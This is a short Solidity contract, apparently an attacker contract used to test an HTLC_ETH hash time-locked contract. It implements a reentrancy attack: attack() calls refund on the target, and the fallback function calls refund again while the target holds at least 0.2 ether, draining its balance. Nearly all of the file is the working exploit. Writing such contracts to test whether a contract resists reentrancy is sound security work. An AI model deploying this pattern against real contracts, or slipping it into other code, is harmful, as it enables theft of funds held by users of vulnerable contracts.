pragma solidity 0.8.10;

import "../htlc/HTLC_ETH.sol";

//  SPDX-License-Identifier: UNLICENSED



contract RefundReEntrancy {

    HTLC_ETH htlcEth;

    bytes32 id;
    address securityToken;
    

    constructor(address _htlcEthAddress) {

        htlcEth = HTLC_ETH(_htlcEthAddress);
    }

    //  contract recieving ether should have a fallback or receive function but payable
   

    fallback() external payable {

        // attack implementation

        if(address(htlcEth).balance >= 0.2 ether) {

            htlcEth.refund(id, securityToken);

        }
          
    }

    

    function attack(bytes32 _swapID, address _securityToken) external {
        id = _swapID;
        securityToken = _securityToken;
    
        htlcEth.refund(_swapID, _securityToken);

    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
 
}